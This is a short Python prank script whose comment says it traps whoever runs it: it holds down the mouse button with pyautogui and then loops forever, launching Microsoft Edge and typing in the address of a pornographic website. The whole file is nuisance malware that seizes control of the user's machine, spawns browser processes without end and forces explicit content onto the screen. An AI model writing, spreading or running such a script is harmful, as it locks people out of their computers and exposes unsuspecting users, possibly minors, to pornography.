import pyautogui
import subprocess
import time

# this script will make the user who runs the code infinitely continue the microsoft edge opening and not being able to move the mouse cursor

def mouse_msedge():
 while True:
  time.sleep(0.001)
  pyautogui.mouseDown(520, 450, duration=5)

  while True:
        time.sleep(0.001)
        subprocess.Popen("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe")
        time.sleep(0.1)
        pyautogui.write('https://pornhub.com')
        pyautogui.press('enter')
mouse_msedge()
